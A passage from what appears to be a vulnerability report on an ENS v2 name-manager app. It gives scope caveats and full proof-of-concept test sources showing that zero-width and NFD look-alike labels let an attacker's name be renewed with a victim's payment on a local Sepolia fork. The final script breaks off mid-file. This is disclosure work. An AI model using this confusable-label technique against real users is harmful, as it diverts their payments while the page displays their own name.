* **This is Sepolia.** ENS v2 is not on mainnet at this revision — `ensEthRegistrar` for mainnet is `zeroAddress` in the project's own chain config. The amounts in §7b are therefore testnet amounts and the severity argument rests on the impact taxonomy, not on funds at risk today. I am stating this plainly rather than letting the transaction hashes imply otherwise.
* **The fork reads deployed Sepolia state into a local EVM.** That is how the project's own e2e stack runs, and every contract address and code hash used is recorded in §7b so the reads can be checked. No transaction was ever sent to a live network.
* **The PoC does not drive a browser.** The label is derived by calling the real production helper and the consequence is a mined transaction, which is what establishes the chain; the intermediate UI rendering is evidenced by the route-level test in §7 rather than by a screenshot. There is no renewal end-to-end spec in the repository to extend.
* `e2e/` is used here only as a proof instrument — it is not where the defect lives. The defect is in `apps/manager`.
* No live network, RPC, DNS or third-party service was contacted at any point.

***

## Appendix A — complete proof-of-concept sources

Reproduced verbatim, byte-for-byte as executed, each with its sha256. Destinations and run commands are in §6. Four files: three vitest, one standalone script.

#### 01 — `apps/manager/src/features/renew/renewNameSplit.poc.test.ts`

The split itself: one URL, two names — both routes, the root-cause helper, and the second consumer.

sha256 of the code block below `e860a63671360148072eee23e03ce48c296ea3cf3333fd0c2aa257774afd5ff2`

```ts
/**
 * One renewal, two different ENS names: the app proves one name is renewable
 * and then bills the user for a different one.
 *
 * `/renew/$name` derives the name TWICE from the same URL path segment:
 *
 *   - the GATE  normalises it   — `routes/renew/$name.tsx:27` passes the raw
 *     param to `profileExpiryQuery`, whose `getExpiry` runs it through
 *     `normalizeEth2LdName` (`profileExpiry.ts:77` -> `profileName.ts:18`,
 *     viem `normalize` = ENSIP-15) before reading the registry. Every gate in
 *     the loader — protocol is v2, not past grace, `canRenewV2Name`, expiry is
 *     non-null — is therefore decided by the NORMALISED name.
 *
 *   - the LABEL that leaves the loader does not — `routes/renew/$name.tsx:61`
 *     returns `parsedName.value.label`, produced by `parseName`
 *     (`name-parser.ts:46`) which only does `trim().toLowerCase()`.
 *
 * `normalize` is not `toLowerCase`. It also NFC-composes and DELETES the
 * "ignorable" code points, so for a great many spellings the two derivations
 * are two different on-chain labels with two different labelhashes.
 *
 * The label that leaves the loader is the one that reaches the money:
 * `ConfirmPurchase.tsx:22` prices it (`renewPricing.query.ts:37-42` hands
 * `label` verbatim to the registrar) and `:63-72` sends it to
 * `renewalUi.machine.ts:151,349` -> `registration.actors.ts:1025-1030`
 * `renew(<label>, ...)`. Meanwhile the page shows the user the expiry the GATE
 * fetched — the other name's.
 *
 * Positive 1: the real loader accepts a spelling whose gate-name and
 *             returned-label are different on-chain names, and returns the
 *             other name's expiry alongside the attacker's label.
 * Positive 2: the real pricing query bills the label the loader returned, not
 *             the name the loader proved renewable.
 * Oracle 1  : with an already-canonical spelling both derivations agree, so
 *             the split is caused by the spelling and not by this test.
 * Oracle 2  : the gate really was decided by the NORMALISED name — the expiry
 *             read is asserted to have been called with it.
 */

import { labelhash } from 'viem'
import { normalize } from 'viem/ens'
import { beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'

const getExpiryMock = vi.fn()
const getOwnerMock = vi.fn()
const getRenewPriceMock = vi.fn()
const isRenewableMock = vi.fn()

vi.mock('@ensdomains/ensjs/public/v2', () => ({
  getExpiry: (...a: unknown[]) => getExpiryMock(...a),
  getOwner: (...a: unknown[]) => getOwnerMock(...a),
  getRenewPrice: (...a: unknown[]) => getRenewPriceMock(...a),
  isRenewable: (...a: unknown[]) => isRenewableMock(...a),
}))
vi.mock('@ensdomains/ensjs/public/v1', () => ({
  getExpiry: vi.fn(),
  getOwner: vi.fn(),
}))
// Partial mock: keep the real chain config, but stub the client so nothing can
// reach a live Sepolia RPC. Every chain answer in this test comes from the
// ensjs mocks above.
vi.mock('@/lib/wagmi', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@/lib/wagmi')>()
  return { ...actual, publicClient: {} }
})
vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  return { safeGetClient: () => ok({}) }
})

/** U+200B ZERO WIDTH SPACE. Renders as nothing; survives `toLowerCase()`. */
const RAW_INVISIBLE = 'vitalik​.eth'
/** NFD: "cafe" + U+0301 COMBINING ACUTE. Not a homoglyph, not bidi, not a control char. */
const RAW_NFD = 'café.eth'

/** A victim expiry comfortably inside the v2 renewal window. */
const VICTIM_EXPIRY = BigInt(Math.floor(Date.now() / 1000) + 200 * 24 * 3600)
const PRICE = { base: 1_000_000n, premium: 0n, amount: 1_000_000n }

/**
 * Answer the registry the way the chain would: the VICTIM's name exists and is
 * renewable; the attacker's raw label is a different name entirely. The mock is
 * keyed on the name it is ASKED for, so it cannot invent the split — whichever
 * derivation the app uses is the one it gets an answer for.
 */
const chainWith = (victimName: string) => {
  getExpiryMock.mockImplementation((_c: unknown, { name }: { name: string }) =>
    name === victimName ? Promise.resolve(VICTIM_EXPIRY) : Promise.resolve(0n),
  )
  getOwnerMock.mockResolvedValue({ protocol: 'v2' })
  getRenewPriceMock.mockResolvedValue(PRICE)
}

const runLoader = async (routeParam: string) => {
  const { QueryClient } = await import('@tanstack/react-query')
  const { Route } = await import('@/routes/renew/$name')
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  const loader = Route.options.loader as (a: {
    params: { name: string }
    context: { queryClient: unknown }
  }) => Promise<{ label: string; currentExpiry: bigint }>
  return loader({ params: { name: routeParam }, context: { queryClient } })
}

/** The label the pricing query actually bills, read off the registrar call. */
const billedLabel = async (label: string) => {
  const { getRenewPrice } = await import(
    '@/features/renew/data/queries/renewPricing.query'
  )
  await getRenewPrice(label, 31_536_000n, 'USDC', 'v2')
  const call = getRenewPriceMock.mock.calls.at(-1)
  return (call?.[1] as { label: string }).label
}

// Importing the route pulls in the app's full wallet/router graph once. Warm it
// here so no individual test absorbs that one-off cost.
beforeAll(async () => {
  await import('@/routes/renew/$name')
}, 120_000)

beforeEach(() => {
  vi.clearAllMocks()
})

describe('renewal: the gated name and the billed name are not the same name', () => {
  it.each([
    ['U+200B ZERO WIDTH SPACE', RAW_INVISIBLE],
    ['NFD combining acute', RAW_NFD],
  ])(
    'POSITIVE (%s) - the loader proves one name renewable and returns the other name as the label',
    async (_tag, raw) => {
      const gateName = normalize(raw)
      chainWith(gateName)

      const loaded = await runLoader(raw)

      // The loader let it through, using the VICTIM's expiry.
      expect(loaded.currentExpiry).toBe(VICTIM_EXPIRY)

      // ...but the label it hands to the renewal flow is the OTHER name.
      const gateLabel = gateName.slice(0, -'.eth'.length)
      expect(loaded.label).not.toBe(gateLabel)
      expect(labelhash(loaded.label)).not.toBe(labelhash(gateLabel))
    },
  )

  it.each([
    ['U+200B ZERO WIDTH SPACE', RAW_INVISIBLE],
    ['NFD combining acute', RAW_NFD],
  ])(
    'POSITIVE (%s) - the price the user is quoted is for the attacker label, not the gated name',
    async (_tag, raw) => {
      const gateName = normalize(raw)
      chainWith(gateName)

      const loaded = await runLoader(raw)
      const billed = await billedLabel(loaded.label)

      expect(billed).toBe(loaded.label)
      expect(billed).not.toBe(gateName.slice(0, -'.eth'.length))
    },
  )

  it('ORACLE - an already-canonical spelling produces NO split', async () => {
    const raw = 'vitalik.eth'
    const gateName = normalize(raw)
    expect(gateName).toBe(raw) // the spelling is already canonical
    chainWith(gateName)

    const loaded = await runLoader(raw)
    const gateLabel = gateName.slice(0, -'.eth'.length)

    expect(loaded.currentExpiry).toBe(VICTIM_EXPIRY)
    expect(loaded.label).toBe(gateLabel)
    expect(labelhash(loaded.label)).toBe(labelhash(gateLabel))
    expect(await billedLabel(loaded.label)).toBe(gateLabel)
  })

  it('ORACLE - the gate really was decided by the NORMALISED name', async () => {
    const gateName = normalize(RAW_INVISIBLE)
    chainWith(gateName)

    await runLoader(RAW_INVISIBLE)

    const asked = getExpiryMock.mock.calls.map(
      (c) => (c[1] as { name: string }).name,
    )
    // The registry was interrogated about the victim's name, never the raw one.
    expect(asked).toContain(gateName)
    expect(asked).not.toContain(RAW_INVISIBLE)
  })
})

describe('the root cause is the shared name helper, not one route', () => {
  const SPELLINGS: ReadonlyArray<readonly [string, string]> = [
    ['U+200B ZERO WIDTH SPACE', 'vitalik\u200b.eth'],
    ['U+00AD SOFT HYPHEN', 'vitalik\u00ad.eth'],
    ['U+2060 WORD JOINER', 'vitalik\u2060.eth'],
    ['U+FE0F VARIATION SELECTOR-16', 'vitalik\ufe0f.eth'],
    ['NFD combining acute', 'cafe\u0301.eth'],
  ]

  it('ROOT CAUSE - parseRenewableName returns a label that is not the ENSIP-15 label', async () => {
    const { parseRenewableName } = await import(
      '@/features/renew/utils/renewableName'
    )
    const { normalizeEth2LdName } = await import(
      '@/features/profile/service/profileName'
    )

    for (const [, raw] of SPELLINGS) {
      const parsed = parseRenewableName(raw)
      const canonical = normalizeEth2LdName(raw)

      // The helper accepts the spelling...
      expect(parsed.isOk()).toBe(true)
      expect(canonical).not.toBeNull()

      // ...and hands back a label that is a DIFFERENT on-chain name.
      const parsedLabel = parsed._unsafeUnwrap().label
      expect(parsedLabel).not.toBe(canonical?.label)
      expect(labelhash(parsedLabel)).not.toBe(labelhash(canonical?.label ?? ''))
    }
  })

  it('ORACLE - the same helper is exact for canonical and uppercase spellings', async () => {
    const { parseRenewableName } = await import(
      '@/features/renew/utils/renewableName'
    )
    const { normalizeEth2LdName } = await import(
      '@/features/profile/service/profileName'
    )

    // Uppercase is the spelling the profile-page split turns on. Here the
    // helper lowercases, so it does NOT diverge — this finding needs the
    // spellings above, which is what makes it a different defect.
    for (const raw of ['vitalik.eth', 'VITALIK.eth']) {
      const parsedLabel = parseRenewableName(raw)._unsafeUnwrap().label
      expect(parsedLabel).toBe(normalizeEth2LdName(raw)?.label)
    }
  })

  it('SECOND CONSUMER - the v1 renewability check is made about the RAW label', async () => {
    isRenewableMock.mockResolvedValue(true)
    const raw = 'vitalik\u200b.eth'

    const { getIsV1Renewable } = await import(
      '@/features/renew/data/queries/v1Renewable.query'
    )
    await getIsV1Renewable(raw)

    const askedAbout = (
      isRenewableMock.mock.calls.at(-1)?.[1] as { label: string }
    ).label

    // `routes/renew-v1/$name.tsx` gates protocol + expiry on the NORMALISED
    // name but asks the chain whether the RAW label is renewable, and then
    // returns that raw label as the one to renew.
    expect(askedAbout).toBe('vitalik\u200b')
    expect(askedAbout).not.toBe(normalize(raw).slice(0, -'.eth'.length))
  })
})
```

#### 02 — `apps/manager/src/features/renew/renewBillingTerminal.poc.test.ts`

The billing terminal, mined against the deployed registrar on a pinned Sepolia fork.

sha256 of the code block below `41a1a809a481aca2f79319e7200abb975645291aad7e1ba904481d9d0fe51fa6`

```ts
/**
 * Gate 2 — the renewal billing terminal, MINED.
 *
 * This test does two things in one artifact:
 *   1. It calls the app's REAL production helper `parseRenewableName` to turn a
 *      URL path segment into the label the renewal flow will bill, and compares
 *      it against the ENSIP-15 name every gate in the loader is decided by.
 *   2. It then sends that exact label to the deployed ETHRegistrar on a local
 *      Anvil Sepolia fork, signed and paid by the VICTIM, and reads the expiry
 *      of both names before and after.
 *
 * Nothing here is mocked. The label is produced by in-scope application code and
 * the money movement is a mined transaction.
 *
 * Requires a FRESH fork:
 *   docker compose -f e2e/infra/docker-compose.yml down
 *   docker compose -f e2e/infra/docker-compose.yml up -d anvil
 *   TZ=UTC pnpm vitest run src/features/renew/renewBillingTerminal.poc.test.ts
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  createPublicClient,
  createTestClient,
  createWalletClient,
  encodeFunctionData,
  http,
  keccak256,
  labelhash,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { normalize } from 'viem/ens'
import { beforeAll, describe, expect, it } from 'vitest'

import { parseRenewableName } from '@/features/renew/utils/renewableName'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = { ...sepolia, rpcUrls: { default: { http: [RPC] } } } as const
const pub = createPublicClient({ chain, transport: http(RPC) })
const test = createTestClient({ chain, transport: http(RPC), mode: 'anvil' })
const wallet = createWalletClient({ chain, transport: http(RPC) })

const s = ensL1Contracts[supportedL1Chains.sepolia]
const REGISTRAR = s.ensEthRegistrar.address as Address
const REGISTRY = s.ensRegistry.address as Address
const USDC = s.usdc.address as Address

/** Registers the confusable label and is the beneficiary of the victim's payment. */
const ATTACKER = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
/** Owns the real name, and is the one who signs and pays the renewal. */
const VICTIM = privateKeyToAccount(
  '0x4d1cf5e322e2a7dbfc9e3eccde100ed93167879de7449d18872911ed3a957a81',
)

const YEAR = BigInt(365 * 24 * 60 * 60)
const DURATION = BigInt(28 * 24 * 60 * 60)

/** The victim's real, ENSIP-15-normalised name. */
const VICTIM_LABEL = 'zqxvbn'
/** The attacker's confusable twin: identical after normalize(), different on chain. */
const ATTACKER_LABEL = 'zqx​vbn'
/** What the victim clicks / what sits in the URL. */
const URL_SEGMENT = `${ATTACKER_LABEL}.eth`

const REGISTRAR_ABI = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function getRenewPrice(string label, uint64 duration, address paymentToken) view returns (uint256)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const REGISTRY_ABI = parseAbi([
  'function getExpiry(uint256 anyId) view returns (uint64)',
])
const ERC20_ABI = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address a) view returns (uint256)',
])

const send = async (account: typeof ATTACKER, to: Address, data: Hex) => {
  const hash = await wallet.sendTransaction({ account, to, data })
  const rcpt = await pub.waitForTransactionReceipt({ hash })
  if (rcpt.status !== 'success') throw new Error(`tx reverted: ${hash}`)
  return rcpt
}

const expiryOf = (label: string) =>
  pub.readContract({
    address: REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getExpiry',
    args: [BigInt(labelhash(label))],
  })

const fund = async (who: typeof ATTACKER) => {
  await test.setCode({ address: who.address, bytecode: '0x' })
  await test.setBalance({ address: who.address, value: 10n ** 20n })
  await send(ATTACKER, USDC, encodeFunctionData({
    abi: ERC20_ABI, functionName: 'mint', args: [who.address, 100_000_000_000n] }))
  const bal = await pub.readContract({
    address: USDC, abi: ERC20_ABI, functionName: 'balanceOf', args: [who.address] })
  // Non-vacuity: a silently-reverted mint would make later steps fail for the
  // wrong reason, so prove the funding actually landed.
  expect(bal).toBeGreaterThan(0n)
}

const registerTo = async (label: string, owner: typeof ATTACKER) => {
  const secret = keccak256(toHex(`g2:${label}`))
  const args = [label, owner.address, secret, zeroAddress, zeroAddress, DURATION] as const
  const commitment = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'makeCommitment',
    args: [...args, zeroHash] })
  await send(owner, REGISTRAR, encodeFunctionData({
    abi: REGISTRAR_ABI, functionName: 'commit', args: [commitment] }))
  const minAge = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'MIN_COMMITMENT_AGE' })
  await test.increaseTime({ seconds: Number(minAge) + 1 })
  await test.mine({ blocks: 1 })
  const [base, premium] = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'getRegisterPrice',
    args: [label, DURATION, USDC] })
  await send(owner, USDC, encodeFunctionData({
    abi: ERC20_ABI, functionName: 'approve', args: [REGISTRAR, (base + premium) * 4n] }))
  await send(owner, REGISTRAR, encodeFunctionData({
    abi: REGISTRAR_ABI, functionName: 'register', args: [...args, USDC, zeroHash] }))
}

/**
 * This PoC needs the fork. If it is not up, SKIP rather than fail - running the
 * repository's suite without docker must not look like a regression from this
 * report. Bring the fork up (see the header) to actually execute the proof.
 */
const forkUp = await (async () => {
  try {
    await pub.getChainId()
    return true
  } catch {
    console.warn(
      '[renewBillingTerminal.poc] SKIPPED - no Anvil fork on ' +
        RPC +
        '. Start it with: docker compose -f e2e/infra/docker-compose.yml up -d anvil',
    )
    return false
  }
})()

describe.skipIf(!forkUp)('renewal billing terminal (mined, against the deployed registrar)', () => {
  beforeAll(async () => {
    await fund(ATTACKER)
    await fund(VICTIM)
    // The victim owns their real name; the attacker owns the confusable twin.
    await registerTo(VICTIM_LABEL, VICTIM)
    await registerTo(ATTACKER_LABEL, ATTACKER)
  }, 300_000)

  it('production parseRenewableName bills a DIFFERENT label than the loader gates on', () => {
    // What every gate in the renew loader is decided by (ENSIP-15):
    const gated = normalize(URL_SEGMENT)
    // What the app actually puts in the renew() calldata (production helper):
    const parsed = parseRenewableName(URL_SEGMENT)
    expect(parsed.isOk()).toBe(true)
    const billed = parsed._unsafeUnwrap().label

    expect(gated).toBe(`${VICTIM_LABEL}.eth`) // the victim's name
    expect(billed).toBe(ATTACKER_LABEL) // the attacker's name
    expect(billed).not.toBe(gated.replace(/\.eth$/, ''))
    // and they are genuinely different on chain
    expect(labelhash(billed)).not.toBe(labelhash(VICTIM_LABEL))
  })

  it('the victim pays, and the ATTACKER’s registration is the one extended', async () => {
    const billed = parseRenewableName(URL_SEGMENT)._unsafeUnwrap().label

    const victimBefore = await expiryOf(VICTIM_LABEL)
    const attackerBefore = await expiryOf(ATTACKER_LABEL)
    const balBefore = await pub.readContract({
      address: USDC, abi: ERC20_ABI, functionName: 'balanceOf', args: [VICTIM.address] })

    const price = await pub.readContract({
      address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'getRenewPrice',
      args: [billed, YEAR, USDC] })
    await send(VICTIM, USDC, encodeFunctionData({
      abi: ERC20_ABI, functionName: 'approve', args: [REGISTRAR, price * 2n] }))

    // THE TERMINAL: the victim's own wallet signs and pays to renew the label
    // the application produced from the URL.
    const rcpt = await send(VICTIM, REGISTRAR, encodeFunctionData({
      abi: REGISTRAR_ABI, functionName: 'renew', args: [billed, YEAR, USDC, zeroHash] }))
    expect(rcpt.status).toBe('success')

    const victimAfter = await expiryOf(VICTIM_LABEL)
    const attackerAfter = await expiryOf(ATTACKER_LABEL)
    console.log(`  renew tx        ${rcpt.transactionHash} (block ${rcpt.blockNumber})`)
    console.log(`  billed label    ${JSON.stringify(billed)}  utf8=${toHex(new TextEncoder().encode(billed))}`)
    console.log(`  victim  expiry  ${victimBefore} -> ${victimAfter}   (delta ${victimAfter - victimBefore})`)
    console.log(`  attacker expiry ${attackerBefore} -> ${attackerAfter}   (delta ${attackerAfter - attackerBefore})`)
    const balAfter = await pub.readContract({
      address: USDC, abi: ERC20_ABI, functionName: 'balanceOf', args: [VICTIM.address] })
    console.log(`  victim USDC     ${balBefore} -> ${balAfter}   (paid ${balBefore - balAfter})`)

    // The victim really paid.
    expect(balAfter).toBeLessThan(balBefore)
    expect(balBefore - balAfter).toBe(price)
    // The attacker's name got the year.
    expect(attackerAfter - attackerBefore).toBe(YEAR)
    // The victim's own name got nothing.
    expect(victimAfter).toBe(victimBefore)
  }, 300_000)

  it('CONTROL: the same call with the NORMALISED label extends the victim instead', async () => {
    // Same terminal, same payer, same duration - only the label differs. This
    // proves the divergence above is caused by the label and not by anything
    // else in the path.
    const victimBefore = await expiryOf(VICTIM_LABEL)
    const attackerBefore = await expiryOf(ATTACKER_LABEL)

    const price = await pub.readContract({
      address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'getRenewPrice',
      args: [VICTIM_LABEL, YEAR, USDC] })
    await send(VICTIM, USDC, encodeFunctionData({
      abi: ERC20_ABI, functionName: 'approve', args: [REGISTRAR, price * 2n] }))
    await send(VICTIM, REGISTRAR, encodeFunctionData({
      abi: REGISTRAR_ABI, functionName: 'renew', args: [VICTIM_LABEL, YEAR, USDC, zeroHash] }))

    expect((await expiryOf(VICTIM_LABEL)) - victimBefore).toBe(YEAR)
    expect(await expiryOf(ATTACKER_LABEL)).toBe(attackerBefore)
  }, 300_000)
})
```

#### 03 — `apps/manager/src/features/renew/renewHeaderDisplay.poc.test.tsx`

The rendered heading: the name displayed is not the name renewed.

sha256 of the code block below `753f42742d90fb75f93c6166beec7f02401af3baba33071cf202fc25826eeca1`

```tsx
/**
 * The renewal page's heading displays a name that is not the name being renewed.
 *
 * The loader hands the pricing step the label produced by `parseRenewableName`
 * (`trim().toLowerCase()`, no ENSIP-15 normalisation) while every gate on the same
 * route was decided by the ENSIP-15-normalised name. `PricingDomainHeader` renders
 * that label as the page's <h1>, directly above the price the user approves.
 *
 * Because the differentiating codepoint is zero width, the heading a human reads is
 * the victim's own name.
 */
import { screen } from '@testing-library/react'
import { normalize } from 'viem/ens'
import { describe, expect, it } from 'vitest'
import { PricingDomainHeader } from '@/features/register-v2/workflow/pricing/components/PricingDomainHeader'
import { getPremiumLabel } from '@/features/register-v2/workflow/pricing/lib/premiumLabel'
import { parseRenewableName } from '@/features/renew/utils/renewableName'
import { render } from '@/utils/test-utils'

const VICTIM_NAME = 'zqxvbn.eth'
const ATTACKER_URL_NAME = 'zqx​vbn.eth' // U+200B ZERO WIDTH SPACE

/** What a human actually reads: zero-width and format codepoints render as nothing. */
const asSeenByAUser = (s: string) => s.replace(/[​­⁠️]/g, '')

const labelFromLoader = (urlName: string) => {
  const parsed = parseRenewableName(urlName)
  if (parsed.isErr()) throw parsed.error
  return parsed.value.label
}

describe('renewal heading vs renewed name', () => {
  it('renders the ATTACKER label in the <h1> while a human reads the VICTIM name', () => {
    const label = labelFromLoader(ATTACKER_URL_NAME)

    // the route's gates were decided by this, and it is a different name
    expect(normalize(ATTACKER_URL_NAME)).toBe(VICTIM_NAME)
    expect(`${label}.eth`).not.toBe(VICTIM_NAME)

    render(<PricingDomainHeader label={label} />)
    const heading = screen.getByRole('heading', { level: 1 })
    const shown = heading.textContent ?? ''

    // the heading carries the attacker's codepoint verbatim
    expect(shown).toBe(`${label}.eth`)
    expect(shown).toContain('​')
    expect([...shown].map((c) => c.codePointAt(0))).toContain(0x200b)

    // and what the user reads is the victim's own name
    expect(asSeenByAUser(shown)).toBe(VICTIM_NAME)

    // the tooltip repeats it, so hovering does not reveal the difference either
    expect(asSeenByAUser(heading.getAttribute('title') ?? '')).toBe(VICTIM_NAME)
  })

  it('gives the user no other visible tell: the premium pill is identical', () => {
    const attackerLabel = labelFromLoader(ATTACKER_URL_NAME)
    const victimLabel = labelFromLoader(VICTIM_NAME)

    expect(attackerLabel.length).not.toBe(victimLabel.length)
    // yet the pill only exists at 3 and 4 characters, so neither name shows one
    expect(getPremiumLabel(attackerLabel.length)).toBeUndefined()
    expect(getPremiumLabel(victimLabel.length)).toBeUndefined()

    const { container } = render(<PricingDomainHeader label={attackerLabel} />)
    expect(container.querySelectorAll('[class*="premium"]')).toHaveLength(0)
  })


  it('LEAD CASE - NFD: a combining mark is neither homoglyph, bidi, nor a control character', () => {
    const NFC = 'caf\u00e9.eth' // precomposed U+00E9
    const NFD = 'cafe\u0301.eth' // e + U+0301 COMBINING ACUTE ACCENT

    // the two spellings are different strings that render identically
    expect(NFD).not.toBe(NFC)
    expect(NFD.normalize('NFC')).toBe(NFC)
    // and ENSIP-15 folds one onto the other, so every gate on the route agrees
    expect(normalize(NFD)).toBe(NFC)

    // but the label the app prices and renews keeps the decomposed form
    const label = labelFromLoader(NFD)
    expect(`${label}.eth`).toBe(NFD)
    expect(`${label}.eth`).not.toBe(NFC)

    render(<PricingDomainHeader label={label} />)
    const shown = screen.getByRole('heading', { level: 1 }).textContent ?? ''

    // the heading carries the combining mark verbatim ...
    expect([...shown].map((c) => c.codePointAt(0))).toContain(0x0301)
    // ... yet is canonically equivalent to the victim's name, i.e. indistinguishable on screen
    expect(shown.normalize('NFC')).toBe(NFC)
    expect(shown).not.toBe(NFC)
  })

  it('ORACLE - a canonical spelling produces a heading that is genuinely the same name', () => {
    const label = labelFromLoader(VICTIM_NAME)
    expect(`${label}.eth`).toBe(VICTIM_NAME)

    render(<PricingDomainHeader label={label} />)
    const shown = screen.getByRole('heading', { level: 1 }).textContent ?? ''

    expect(shown).toBe(VICTIM_NAME)
    expect(shown).not.toContain('​')
    // the rendered string and the renewed name are byte-identical, not merely look-alike
    expect(asSeenByAUser(shown)).toBe(shown)
  })
})
```

#### 04 — `e2e/scripts/poc-nonnormalized-register.ts`

That the deployed registrar accepts a non-normalized label and registers it to a caller-chosen owner.

sha256 of the code block below `03aa6d7212baf96d7975816de9febb738560e2e327969fcd64d5856f529d2c39`

```ts
/**
 * Gate 1 — prove the ENSv2 ETHRegistrar accepts a NON-NORMALIZED label and
 * registers it to a CALLER-CHOSEN owner.
 *
 * Runs entirely against the local Anvil Sepolia fork. No live network writes.
 *
 *   docker compose -f e2e/infra/docker-compose.yml up -d anvil
 *   pnpm --filter e2e exec tsx scripts/poc-nonnormalized-register.ts
 *
 * Labels are used EXACTLY as written - no uniquifying suffix is appended, so
 * every claim below is literally the string that reached the chain.
 */
import {
  createPublicClient,
  createTestClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  http,
  keccak256,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const chain = { ...sepolia, rpcUrls: { default: { http: [RPC] } } } as const
const pub = createPublicClient({ chain, transport: http(RPC) })
const test = createTestClient({ chain, transport: http(RPC), mode: 'anvil' })
const wallet = createWalletClient({ chain, transport: http(RPC) })

const s = ensL1Contracts[supportedL1Chains.sepolia]
const REGISTRAR = s.ensEthRegistrar.address as Address
const REGISTRY = s.ensRegistry.address as Address
const USDC = s.usdc.address as Address

/** Anvil default account 0 - plays the ATTACKER (signs + pays). */
const ATTACKER = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
/** A different key entirely - plays the VICTIM (never signs anything here). */
const VICTIM = privateKeyToAccount(
  '0x4d1cf5e322e2a7dbfc9e3eccde100ed93167879de7449d18872911ed3a957a81',
)

const DURATION = BigInt(28 * 24 * 60 * 60)

const REGISTRAR_ABI = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function isAvailable(string label) view returns (bool)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
  'event NameRegistered(uint256 indexed tokenId, string label, address owner, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 indexed referrer, uint256 base, uint256 premium)',
  'error NotValid(string label)',
])
const REGISTRY_ABI = parseAbi([
  'function getState(uint256 anyId) view returns ((uint8 status, uint64 expiry, address latestOwner, uint256 tokenId, uint256 resource))',
])
const ERC20_ABI = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address a) view returns (uint256)',
])

let failures = 0
const ok = (cond: boolean, msg: string) => {
  console.log(`  ${cond ? 'PASS' : 'FAIL'}  ${msg}`)
  if (!cond) failures++
}
const send = async (account: typeof ATTACKER, to: Address, data: Hex) => {
  const hash = await wallet.sendTransaction({ account, to, data })
  return pub.waitForTransactionReceipt({ hash })
}

/** Register `label` to `owner`, signed and paid by ATTACKER. */
async function register(label: string, owner: Address) {
  const secret = keccak256(toHex(`poc:${label}`))
  const args = [
    label, owner, secret, zeroAddress, zeroAddress, DURATION,
  ] as const

  const commitment = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'makeCommitment',
    args: [...args, zeroHash],
  })
  await send(ATTACKER, REGISTRAR,
    encodeFunctionData({ abi: REGISTRAR_ABI, functionName: 'commit', args: [commitment] }))

  const minAge = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'MIN_COMMITMENT_AGE',
  })
  await test.increaseTime({ seconds: Number(minAge) + 1 })
  await test.mine({ blocks: 1 })

  const [base, premium] = await pub.readContract({
    address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'getRegisterPrice',
    args: [label, DURATION, USDC],
  })
  const price = base + premium

  // Non-vacuity guard: a silently-reverted mint would make register() fail for
  // the WRONG reason, so assert funding actually landed before proceeding.
  const bal = await pub.readContract({
    address: USDC, abi: ERC20_ABI, functionName: 'balanceOf', args: [ATTACKER.address],
  })
  if (bal < price) throw new Error(`attacker USDC ${bal} < price ${price} - funding failed`)

  await send(ATTACKER, USDC, encodeFunctionData({
    abi: ERC20_ABI, functionName: 'approve', args: [REGISTRAR, price * 2n] }))

  const rcpt = await send(ATTACKER, REGISTRAR, encodeFunctionData({
    abi: REGISTRAR_ABI, functionName: 'register', args: [...args, USDC, zeroHash] }))

  let evt: { label: string; owner: Address; tokenId: bigint } | undefined
  for (const lg of rcpt.logs) {
    try {
      const d = decodeEventLog({ abi: REGISTRAR_ABI, data: lg.data, topics: lg.topics })
      if (d.eventName === 'NameRegistered') evt = d.args as never
    } catch { /* not our event */ }
  }
  return { rcpt, evt, price }
}

async function main() {
